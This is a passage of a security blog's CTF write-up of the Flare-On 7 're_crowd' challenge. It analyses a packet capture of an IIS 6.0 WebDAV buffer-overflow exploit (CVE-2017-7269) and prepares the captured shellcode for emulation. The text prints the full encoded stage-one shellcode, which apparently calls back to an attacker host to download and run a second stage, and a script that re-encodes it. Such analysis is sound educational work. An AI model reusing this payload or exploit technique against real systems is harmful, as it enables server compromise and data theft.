<!DOCTYPE html>









<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en"
  
    data-mode="dark"
  
>

  <!-- The Head -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >

  
    

    
  

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Data exfiltration: From shellcode to flag" />
<meta property="og:locale" content="en" />
<meta name="description" content="At Flare 7th edition, my favorite challenge was re_crowd, this challenge was really close to a very real world scenario, with just an pcap we are able to understand how the company was attacked, what exploit was used and what shellcode was sent, literally: Why, what and how ?" />
<meta property="og:description" content="At Flare 7th edition, my favorite challenge was re_crowd, this challenge was really close to a very real world scenario, with just an pcap we are able to understand how the company was attacked, what exploit was used and what shellcode was sent, literally: Why, what and how ?" />
<link rel="canonical" href="https://reversing.codes/posts/Retrieving-the-exfiltrated-flag-flareon7/" />
<meta property="og:url" content="https://reversing.codes/posts/Retrieving-the-exfiltrated-flag-flareon7/" />
<meta property="og:site_name" content="Reversing codes" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-10-23T20:25:36-03:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Data exfiltration: From shellcode to flag" />
<meta name="twitter:site" content="@buzz3r_" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2020-10-23T20:25:36-03:00","datePublished":"2020-10-23T20:25:36-03:00","description":"At Flare 7th edition, my favorite challenge was re_crowd, this challenge was really close to a very real world scenario, with just an pcap we are able to understand how the company was attacked, what exploit was used and what shellcode was sent, literally: Why, what and how ?","headline":"Data exfiltration: From shellcode to flag","mainEntityOfPage":{"@type":"WebPage","@id":"https://reversing.codes/posts/Retrieving-the-exfiltrated-flag-flareon7/"},"url":"https://reversing.codes/posts/Retrieving-the-exfiltrated-flag-flareon7/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Data exfiltration: From shellcode to flag | Reversing codes
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Reversing codes">
<meta name="application-name" content="Reversing codes">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.1/dist/jquery.min.js"></script>

  
</head>


  <body data-topbar-visible="true">

    <!--
  The Side Bar
-->
<style>
  body {
      text-align: justify;
  }
  </style>
  
<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="https://avatars.githubusercontent.com/u/22428720" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title">
      <a href="/">Buzzer's blog</a>
    </div>
    <div class="site-subtitle font-italic">Security Researcher & Dreamer</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    

    
      

      
      <a href="https://github.com/buzzer-re" aria-label="github"
        
        
          
          target="_blank"
        

        

        rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/buzz3r_" aria-label="twitter"
        
        
          
          target="_blank"
        

        

        rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        
        

        

        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

      <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-V8QSGFHYFB"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag() { dataLayer.push(arguments); }
        gtag('js', new Date());
        id = 'G-V8QSGFHYFB'
        gtag('config', id);
    </script>
</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>Data exfiltration: From shellcode to flag</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">
        





<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->


<!-- images -->




  
  

  <!-- CDN URL -->
  

  <!-- Add image path -->
  

  
    
      
      
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  

  
  

  




<!-- return -->

<h1 data-toc-skip>Data exfiltration: From shellcode to flag</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Posted
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1603495536"
    data-df="ll"
    data-toggle="tooltip" data-placement="bottom">
  Oct 23, 2020
</em>

    </span>

    <!-- lastmod date -->
    

  

  <div class="d-flex justify-content-between">
    <!-- author(s) -->
    <span>
      

      By

      <em>
      
        <a href="https://github.com/buzzer-re">Buzzer</a>
      
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="1886 words">
  <em>10 min</em> read</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>At Flare 7th edition, my favorite challenge was <strong><em>re_crowd</em></strong>, this challenge was really close to a very real world scenario, with just an <strong><em>pcap</em></strong> we are able to understand how the company was attacked, what exploit was used and what shellcode was sent, literally: <strong><em>Why, what and how ?</em></strong></p>

<h1 id="why-is-this-useful-">Why is this useful ?</h1>

<h2 id="networking-analysis"><span class="mr-2">Networking analysis</span><a href="#networking-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Everything was a dump of the network traffic, every analysis need to be done in top of a <strong><em>pcap</em></strong> file, this is all we need to understand the following points:</p>
<ul>
  <li>The protocol exploited</li>
  <li>The service exploited</li>
  <li>The exploit used</li>
  <li>The shellcode used</li>
  <li>The data exfiltrated</li>
</ul>

<h2 id="encoded-polyphormic-shellcode-analysis"><span class="mr-2">Encoded polyphormic Shellcode analysis</span><a href="#encoded-polyphormic-shellcode-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Also, we need to be able to debug a shellcode, this is very uncommon in CTF challenges and this was the first time I ever seen a challenge with that. With a extracted shellcode from the pcap, we will do the following:</p>

<ul>
  <li>Fix the payload to use the correct unicode format</li>
  <li>Reverse engineer a polymorphic shellcode routine</li>
  <li>Understand the encode routine</li>
  <li>Be able to create a fake C2 infrastructure to retrieve the exfiltrated data</li>
</ul>

<p>So, let’s start our analysis!</p>

<p>Message:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>Hello,

Here at Reynholm Industries we pride ourselves on everything.
It's not easy to admit, but recently one of our most valuable servers was breached. 
We don't believe in host monitoring so all we have is a network packet capture.
We need you to investigate and determine what data was extracted from the server, if any.

Thank you
</pre></td></tr></tbody></table></code></div></div>

<h1 id="recon">Recon</h1>

<h2 id="context"><span class="mr-2">Context</span><a href="#context" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>First, we can read this pcap file with <a href="https://www.wireshark.org/">Wireshark</a>, there you can see that the traffic starts with an HTTP request in a new Web forum of Reynholm Industries, in their conversation, <strong><em>jen</em></strong> said that she kept the accounts files at <strong><em>c:\accounts.txt</em></strong>, and that her need help to create their accounts in this new application.</p>

<p><a href="/assets/images/re_crowd/attack_context.png" class="popup img-link "><img data-src="/assets/images/re_crowd/attack_context.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<h2 id="exploitation"><span class="mr-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Later on, we notice an request that look very strange, and after that packet the server connect back at por <strong><em>4444</em></strong> of the possible attacker, load something and then send some data to port <strong><em>1337</em></strong> of 192.168.68.21:</p>

<p><a href="/assets/images/re_crowd/attack.png" class="popup img-link "><img data-src="/assets/images/re_crowd/attack.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<p>This exploit is abusing of a Buffer overflow vulnerability in Windows server 2003 running IIS 6.0, I know that because it was a famous exploit that explore WebDav protocol,<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2017-7269">CVE-2017-7269</a>, I also found the first published <a href="https://www.exploit-db.com/exploits/41738">exploit</a> from Zhiniang Peng &amp; Chen Wu.</p>

<p>If you take a look at the exploit, it’s a buffer overflow + ROP chain exploitation, and the structure it’s very similar of this attack.</p>

<p><a href="/assets/images/re_crowd/first_exploit.png" class="popup img-link "><img data-src="/assets/images/re_crowd/first_exploit.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<p>Of course this is not the same file used here, as this exploit just pop <strong><em>calc.exe</em></strong>, and the attacker one looks to do much more (And notice that the first exploit don’t have the <strong><em>&gt;</em></strong> at the end of the shellcode).</p>

<p>This exploit, is actually the Metasploit module of it, take a look at <strong><em>exploits/windows/iis/iis_webdav_scstoragepathfromurl</em></strong> exploit function:</p>

<p><a href="/assets/images/re_crowd/metasploit_module.png" class="popup img-link "><img data-src="/assets/images/re_crowd/metasploit_module.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<p>So here is how this is what the attacker is using to exploit the server, the exploits works like:</p>

<ul>
  <li>It first overflow the url path</li>
  <li>After the overflow it make 3 <a href="https://ropemporium.com/">ROP chains</a> and load the encoded payload</li>
  <li>All the bytes are encoded in unicode (I will back soon in this part)</li>
  <li>The encoded payload is executed</li>
</ul>

<h1 id="shellcode-analysis">Shellcode analysis</h1>

<p>Ok, this is all the attack stages in order:</p>

<p><a href="/assets/images/re_crowd/attack_streams.png" class="popup img-link "><img data-src="/assets/images/re_crowd/attack_streams.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<p>So, after the shellcode succesfully execute in the server, it will download the stage2 from port 4444 and allocate and run the malicious code in memory then it will send something to port 1337.</p>

<p>In order to get the data that was exfiltrated, we must:</p>

<ul>
  <li>Decode this shellcode</li>
  <li>Reverse engineering their code</li>
  <li>Understand how data is being encoded/encrypted</li>
  <li>Get the exfiltrated data, aka flag</li>
</ul>

<p>So, let’s go :)</p>

<h2 id="alphanumeric-shellcodes"><span class="mr-2">Alphanumeric shellcodes</span><a href="#alphanumeric-shellcodes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>You can cleary see that this shellcode is in plain text, if you never face that before you maybe think that this en encoded using base64/32, but it’s not.</p>

<p>This is called Alphanumeric shellcode, an shellcode that was converted to a sequence of bytes that can be representated as chars, and this new code contain in itself the decompression routine, in order words, this shellcode is able to decode itself in memory and reveal the real code. I strongly recommend the following lectures, <a href="https://www.corelan.be/index.php/2009/11/06/exploit-writing-tutorial-part-7-unicode-from-0x00410041-to-calc/">corlean.be</a> and <a href="https://www.fuzzysecurity.com/tutorials/expDev/5.html">fuzzy security</a>.</p>

<p>This encoder is detect by it’s pattern and because is the default encoder of this payload, we can check that in the real exploit and in the metasploit module:</p>

<p><a href="/assets/images/re_crowd/encoder_metasploit.png" class="popup img-link "><img data-src="/assets/images/re_crowd/encoder_metasploit.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<h2 id="a-note-about-bufferregister"><span class="mr-2">A note about BufferRegister</span><a href="#a-note-about-bufferregister" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>In order to this kind of shellcode work, it must need where he is in memory, because it will use his absolute address to start the decompression routine, this address must be supplied by a register, in metasploit the default register that will hold the shellcode address is <strong><em>ESI</em></strong>, for this exploit, but if you generate a <a href="https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/">alphanumeric shellcode</a> it will by default create a prefix of 8 bytes, with non alpha bytes, that will set the right address to the register, if you use the option <strong><em>BufferRegister</em></strong>, it will remove this pre-instruction and will be the job of the exploit writer to find this address and load in the register that was chosen.</p>

<h2 id="a-note-about-unicode-shellcode"><span class="mr-2">A note about unicode shellcode</span><a href="#a-note-about-unicode-shellcode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>This exploit is using an mixed unicode shellcode, it’s behaviour is the same as the alphanum, the only difference here is that this kind of encoding is used because windows use unicode as default charset (that’s why each instruction is converted to unicode-utf8 in the exploit), when windows load this shellcode, it will convert to unicode and the exploit will works normally.</p>

<p>… A lot, uh ?</p>

<h2 id="fixing-the-shellcode-encoding"><span class="mr-2">Fixing the shellcode encoding</span><a href="#fixing-the-shellcode-encoding" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>As I said before, this shellcode is expecting that windows “fix” to unicode, but I will manually run this exploit using <a href="http://sandsprite.com/blogs/index.php?uid=7&amp;pid=152">scdbg</a> and <a href="http://sandsprite.com/blogs/index.php?uid=7&amp;pid=152">x64dbg</a>, so I need this exploit in the correct encoding format.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="n">shellcode</span><span class="o">=</span><span class="sh">"</span><span class="s">VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBYlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBkPRMDbksBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImPIqgctKMyZxk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLLPKdKNxKlYqZ3tKLDDKYqXPdIq4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1DS8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYopN9xbUHl0hzPWEVBR6yofu0j9pQZkTqFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5ioGeBmDX9pkQ9pM0r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBLD4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMDIwyn90SE7xMa7kKN7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAA</span><span class="sh">"</span>
<span class="n">fixed_shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>

<span class="k">for</span> <span class="n">code</span> <span class="ow">in</span> <span class="n">shellcode</span><span class="p">:</span>
    <span class="n">fixed_shellcode</span> <span class="o">+=</span> <span class="n">code</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
    <span class="n">fixed_shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span>

<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">shellcode_fixed.bin</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">shellcode_fd</span><span class="p">:</span>
    <span class="n">shellcode_fd</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">fixed_shellcode</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Shellcode fixed [+]</span><span class="sh">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>After that, we will have this:</p>

<p><a href="/assets/images/re_crowd/shellcode_fixed.png" class="popup img-link "><img data-src="/assets/images/re_crowd/shellcode_fixed.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<p>Rather then:</p>

<p><a href="/assets/images/re_crowd/unfixed_shellcode.png" class="popup img-link "><img data-src="/assets/images/re_crowd/unfixed_shellcode.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<h1 id="running-shellcode-in-scdbg">Running shellcode in scdbg</h1>

<p>I will use scdbg for this task, we know that the exploit is already fixed, we can use scdbg to emulate this exploit instructions.</p>

<p><a href="/assets/images/re_crowd/shellcode_running.png" class="popup img-link "><img data-src="/assets/images/re_crowd/shellcode_running.png" alt="" class="lazyload" data-proofer-ignore></a></p>

